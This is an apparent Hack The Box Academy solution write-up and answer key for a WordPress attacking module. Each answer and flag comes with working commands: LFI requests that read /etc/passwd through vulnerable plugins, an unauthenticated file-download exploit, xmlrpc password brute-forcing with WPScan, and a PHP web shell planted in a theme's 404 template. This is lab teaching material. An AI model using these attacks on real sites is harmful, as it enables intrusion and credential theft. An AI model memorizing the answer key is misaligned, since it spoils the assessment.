
| Section | Question Number | Answer |
| --- | --- | --- |
| Directory Indexing | Question 1 | HTB{3num3r4t10n\_15\_k3y} |
| User Enumeration | Question 1 | ch4p |
| Login | Question 1 | 80 |
| WPScan Enumeration | Question 1 | 1.5.34 |
| Exploiting a Vulnerable Plugin | Question 1 | sally.jones |
| Attacking WordPress Users | Question 1 | lizard |
| RCE via the Theme Editor | Question 1 | HTB{rc3\_By\_d3s1gn} |
| Skills Assessment - WordPress | Question 1 | 5.1.6 |
| Skills Assessment - WordPress | Question 2 | twentynineteen |
| Skills Assessment - WordPress | Question 3 | HTB{d1sabl3\_d1r3ct0ry\_l1st1ng!} |
| Skills Assessment - WordPress | Question 4 | Charlie Wiggins |
| Skills Assessment - WordPress | Question 5 | HTB{unauTh\_d0wn10ad!} |
| Skills Assessment - WordPress | Question 6 | 1.1.1 |
| Skills Assessment - WordPress | Question 7 | frank.mclane |
| Skills Assessment - WordPress | Question 8 | HTB{w0rdPr355\_4SS3ssm3n7} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Directory Indexing

## Question 1

### "Keep in mind the key WordPress directories discussed in the WordPress Structure section. Manually enumerate the target for any directories whose contents can be listed. Browse these directories and locate a flag with the file name flag.txt and submit its contents as the answer."

After spawning the target machine, students can either manually enumerate for directories whose contents can be listed or, run `WPScan`; students will notice that the `mail-masta` plugin directories can be listed:

Code: shell

```shell
wpscan --url http://STMIP:STMPO
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://157.245.33.77:30116

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _\` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

<SNIP>

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://157.245.33.77:30116/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://157.245.33.77:30116/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://157.245.33.77:30116/wp-content/plugins/mail-masta/readme.txt

<SNIP>
```

Therefore, students need to visit the different directories it has, finding the flag file "flag.txt" inside `/inc/`, with its full path being `http://STMIP:STMPO/wp-content/plugins/mail-masta/inc/flag.txt`, holding `HTB{3num3r4t10n_15_k3y}`:

![[HTB Solutions/CBBH/z. images/0ae69596569a6caf005616a0b404b2b6_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/81e427d466f62a2eaf8377cb20e086ed_MD5.jpg]]

Answer: `HTB{3num3r4t10n_15_k3y}`

# User Enumeration

## Question 1

### "From the last cURL command, what user name is assigned to User ID 2?"

From the output in "JSON Endpoint" of the module's section, students will know that the user name is `ch4p`:

![[HTB Solutions/CBBH/z. images/b238ee5cd1684042d87ed40170c498b8_MD5.jpg]]

Answer: `ch4p`

# Login

## Question 1

### "Search for "WordPress xmlrpc attacks" and find out how to use it to execute all method calls. Enter the number of possible method calls of your target as the answer."

Upon online searching, students will find out from the [WordPress website](https://codex.wordpress.org/XML-RPC/system.listMethods) that there is a method named `listMethods` that returns a list of available methods, therefore, students need to invoke it on the spawned target machine and use `grep` to filter out the method names, then at last use `wc`, to attain a total of 80 possible method calls:

Code: shell

```shell
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://STMIP:STMPO/xmlrpc.php | grep string | wc -l
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://157.245.41.248:30910/xmlrpc.php | grep string | wc -l

80
```

Answer: `80`

# WPScan Enumeration

## Question 1

### "Enumerate the provided WordPress instance for all installed plugins. Perform a scan with WPScan against the target and submit the version of the vulnerable plugin named “photo-gallery”."

After spawning the target machine, students need to run `WPScan` against it with the `-e` (short version of `--enumerate`) option and the `ap` (short for `all plugins`) choice; students will find out the version of `photo-gallery` is `1.5.34`:

Code: shell

```shell
wpscan --url http://STMIP:STMPO --enumerate ap
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://157.245.41.248:30910 --enumerate ap

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _\` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://157.245.41.248:30910/ [157.245.41.248]
[+] Started: Wed Jun 22 18:01:08 2022

<SNIP>

[+] photo-gallery
 | Location: http://157.245.41.248:30910/wp-content/plugins/photo-gallery/
 | Last Updated: 2022-06-16T06:24:00.000Z
 | [!] The version is out of date, the latest version is 1.6.7
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.34 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
 |  - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
 |  - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
 |  - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://157.245.41.248:30910/wp-content/plugins/photo-gallery/readme.txt

<SNIP>
```

Answer: `1.5.34`

# Exploiting a Vulnerable Plugin

## Question 1

### "Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell."

After spawning the target machine, students need to exploit the LFI vulnerability, using `cURL` and `grep` to filter out the answer; the only non-root user on the system with a login shell is `sally.jones`:

Code: shell

```shell
curl -s http://STMIP:STMPO/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "bash"
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s http://138.68.185.195:30821/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "bash"

sally.jones:x:1001:1001:Linux User,,,:/home/sally.jones:/bin/bash
```

Answer: `sally.jones`

# Attacking WordPress Users

## Question 1

### "Perform a bruteforce attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer."

After spawning the target machine, students need to perform a bruteforce attack using `WPscan` with either the `wp-login` method or `xmlrpc`, however, since the `xmlrpc` method is allowed, it is preferred over `wp-login`. Students will find out that the password for the `roger` user is `lizard`:

Code: shell

```shell
wpscan --password-attack xmlrpc -t 40 -U roger -P /usr/share/wordlists/rockyou.txt --url http://STMIP:STMPO
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --password-attack xmlrpc -t 40 -U roger -P /usr/share/wordlists/rockyou.txt --url  http://206.189.25.173:32521

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _\` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://206.189.25.173:32521/ [206.189.25.173]
[+] Started: Thu Jun 23 06:25:23 2022

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - roger / lizard                                                                                                                               
Trying roger / jacqueline Time: 00:01:24 <> (1920 / 14346312)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: roger, Password: lizard
```

Answer: `lizard`

# RCE via the Theme Editor

## Question 1

### "Use the credentials for the admin user \[admin:sunshine1\] and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory."

After spawning the target machine, students need to login at `http://STMIP:STMPO/wp-login.php` using the credentials `admin:sunshine1`:

![[HTB Solutions/CBBH/z. images/ce6a030df6a39e81723f642621b3bfff_MD5.jpg]]

Subsequently, students need to click on `Appearance` then on `Theme Editor`:

![[HTB Solutions/CBBH/z. images/23a1a49c15a6d4341b0b995c6a17b63b_MD5.jpg]]

Students then need to choose the `Twenty Sixteen` theme then click on `Select`:

![[HTB Solutions/CBBH/z. images/1b928dae6c8e8746aec74f1acd642ff4_MD5.jpg]]

Subsequently, students need to choose the `404 Template` page and add to it at the top a PHP web shell and then click on "Update File":

Code: php

```php
system($_GET['cmd']);
```

![[HTB Solutions/CBBH/z. images/43d6f6e2be354d566f690c99c0277ada_MD5.jpg]]

At last students need to utilize the web shell to fetch the contents of the flag file in the home directory for the `wp-user` directory:

Code: shell

```shell
curl -s http://STMIP:STMPO/wp-content/themes/twentysixteen/404.php?cmd=cat%20/home/wp-user/flag.txt
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s http://46.101.28.14:31864/wp-content/themes/twentysixteen/404.php?cmd=cat%20/home/wp-user/flag.txt | grep "HTB"

HTB{rc3_By_d3s1gn}
```

Answer: `HTB{rc3_By_d3s1gn}`

# Skills Assessment - WordPress

## Question 1

### "Identify the WordPress version number."

After spawning the target machine, students need to add the VHost entry `STMIP blog.inlanefreight.local` in the `/etc/hosts` file, given that the root page exposes this when hovering over the `Blog` button:

![[HTB Solutions/CBBH/z. images/4e0d87c0c7533906c65ab898e793446e_MD5.jpg]]

Code: shell

```shell
sudo bash -c 'echo "STMIP blog.inlanefreight.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ sudo bash -c 'echo "10.129.2.37 blog.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to run `WPScan` on the added VHost entry, since it is where `WordPress` is installed:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e --no-banner
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e --no-banner
[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 06:01:08 2022

<SNIP>

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
```

From the output of `WPScan`, students will know that the version is `5.1.6`.

Answer: `5.1.6`

# Skills Assessment - WordPress

## Question 2

### "Identify the WordPress theme in use."

Students can either run `WPScan` again or use the output from the previous question

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e --no-banner
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e --no-banner
[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 06:01:08 2022

<SNIP>

[+] WordPress theme in use: twentynineteen
 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'

<SNIP>
```

From the output of `WPScan`, students will know that the theme in use is `twentynineteen`.

Answer: `twentynineteen`

# Skills Assessment - WordPress

## Question 3

### "Submit the contents of the flag file in the directory with directory listing enabled."

Students need to perform directory bruteforcing on the directory `/wp-content/`, to find the sub-directory `/uploads`:

Code: shell

```shell
gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/wordlists/metasploit/wp-plugins.txt -k -t 50 -q
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/wordlists/metasploit/wp-plugins.txt -k -t 50 -q

/plugins              (Status: 301) [Size: 349] [--> http://blog.inlanefreight.local/wp-content/plugins/]
/uploads              (Status: 301) [Size: 349] [--> http://blog.inlanefreight.local/wp-content/uploads/]
```

Alternatively, students can use `WPScan` and set the `detection mode` to be `aggressive` to find directories with listing enabled:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e vp --no-banner --detection-mode aggressive
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e vp --no-banner --detection-mode aggressive

[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 07:42:36 2022

Interesting Finding(s):

<SNIP>

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

<SNIP>
```

Visiting the `wp-content/uploads/` directory, students will find the flag `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}` contained within the file `upload_flag.txt`:

![[HTB Solutions/CBBH/z. images/08af4bceea54c7f639a7713f51912c8e_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/601dd1be1c2c3ef723bc1d694b086d29_MD5.jpg]]

Answer: `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}`

# Skills Assessment - WordPress

## Question 4

### "Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)"

Students need to run `WPScan` and enumerate users:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e u
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e --no-banner

[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 06:55:44 2022

<SNIP>

[i] User(s) Identified:

[+] erika
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Display Name (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Charlie Wiggins
 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)

<SNIP>
```

From the output of `WPScan`, students will know that the only non-admin user is `Charlie Wiggins`.

Answer: `Charlie Wiggins`

# Skills Assessment - WordPress

## Question 5

### "Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download."

Students first need to use `WPScan` to enumerate all plugins and set the `--plugins-detectoion` and `--plugins-version-detection` options to be `aggressive`:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 08:03:20 2022

Interesting Finding(s):

<SNIP>

[i] Plugin(s) Identified:

<SNIP>

[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2022-10-19T12:18:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | [!] The version is out of date, the latest version is 5.4.17
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/, status: 200
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt

<SNIP>
```

From the output of `WPScan`, students will know that the website is using the plugin `email-subscribers` version `4.2.2`, which is vulnerable to [unauthenticated file download](https://www.exploit-db.com/exploits/48698). Thus, students need to use the browser, navigate to `http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all%27`, and download the `all-contacts.csv` file:

![[HTB Solutions/CBBH/z. images/47183a867cc82c470e8aa81c3782837f_MD5.jpg]]

Students then need to use `grep` to filter out the flag from the `all-contacts.csv` file:

Code: shell

```shell
grep "HTB{.*}" all\'-contacts.csv
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ grep "HTB{.*}" all\'-contacts.csv

"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
```

From the output, students will know that the flag is `HTB{unauTh_d0wn10ad!}`.

Answer: `HTB{unauTh_d0wn10ad!}`

# Skills Assessment - WordPress

## Question 6

### "What is the version number of the plugin vulnerable to an LFI?"

Students first need to use `WPScan` to enumerate all plugins and set the `--plugins-detectoion` and `--plugins-version-detection` options to be `aggressive`:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-v7emm8wtgq]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60

[+] URL: http://blog.inlanefreight.local/ [10.129.2.37]
[+] Started: Tue Nov  1 08:03:20 2022

Interesting Finding(s):

<SNIP>

[i] Plugin(s) Identified:

<SNIP>

[+] site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/, status: 200
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt

<SNIP>
```

From the output of `WPScan`, students need to search on the found plugins, finding out that [Site Editor 1.1.1](https://www.exploit-db.com/exploits/44340) is vulnerable to local file inclusion.

Answer: `1.1.1`

# Skills Assessment - WordPress

## Question 7

### "Use the LFI to identify a system user whose name starts with the letter "f"."

According to the PoC provided in Exploit Database for [Site Editor 1.1.1 Local File Inclusion](https://www.exploit-db.com/exploits/44340), students need to use `curl` on the `/etc/hosts` file, finding that `frank.mclane` is the system user whose name starts with the letter `f`:

Code: shell

```shell
curl -s http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd | grep -i "^f"
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-j6kdmijpjx]─[~]
└──╼ [★]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd | grep -i "^f"

frank.mclane:x:1002:1002::/home/frank.mclane:/bin/bash
```

Answer: `frank.mclane`

# Skills Assessment - WordPress

## Question 8

### "Obtain a shell on the system and submit the contents of the flag in the /home/erika directory."

Students first need to bruteforce the password of the user `erika` using `WPScan`, utilizing the `xmlrpc` technique, since it is faster:

Code: shell

```shell
wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-j6kdmijpjx]─[~]
└──╼ [★]$ wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.216.109]
[+] Started: Tue Nov  1 09:10:38 2022

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / 010203                                                                                                                                    
Trying erika / tigger1 Time: 00:00:24 <> (700 / 14345092)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: 010203

<SNIP>
```

Thus, the password of the user `erika` is `010203`. Subsequently, using these credentials, students need to navigate to `http://blog.inlanefreight.local/wp-login.php` and login:

![[HTB Solutions/CBBH/z. images/c5969c229456a1b6e3dbe5ab9b8baa1b_MD5.jpg]]

Once logged in, students need to click on "Appearance -> Theme Editor" and then select the `Twenty Seventeen` theme:

![[HTB Solutions/CBBH/z. images/79b42f24818005b769f0f64145b80986_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/74b589358b83cee7ab05b6e9284c7c4c_MD5.jpg]]

After selecting the `Twenty Seventeen` theme, student need to select the `404 Template`, insert a PHP web shell after `<?php` (or alternatively, a reverse shell), and then click on `Update File`:

Code: php

```php
system($_GET['cmd']);
```

![[HTB Solutions/CBBH/z. images/19d6d35b870e6ab8b60df749bd5c8a56_MD5.jpg]]

At last, students need to use the `cmd` URL parameter to list the files within the `/home/erika` directory utilizing `curl` to send the URL-encoded payloads:

Code: shell

```shell
curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika/
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-j6kdmijpjx]─[~]
└──╼ [★]$ curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika/

d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

The file is named `d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt`, thus, students need to use the `cat` command on it:

Code: shell

```shell
curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-j6kdmijpjx]─[~]
└──╼ [★]$ curl -s http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt

HTB{w0rdPr355_4SS3ssm3n7}
```

Answer: `HTB{w0rdPr355_4SS3ssm3n7}`